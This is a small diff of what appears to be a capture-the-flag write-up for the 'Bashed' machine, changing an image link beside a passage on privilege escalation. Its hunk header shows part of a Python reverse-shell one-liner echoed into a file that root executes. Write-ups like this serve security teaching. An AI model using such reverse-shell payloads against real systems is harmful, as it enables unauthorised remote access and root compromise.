@@ -38,5 +38,6 @@ echo 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_ST
 ![root](images/bashed/root-bash.png)
 
 The reason this worked was that python file was being executed by root.
-![bot](images/bashed/bot-bash.png)
+
+![bot](images/bashed/bottom-bash.png)
 
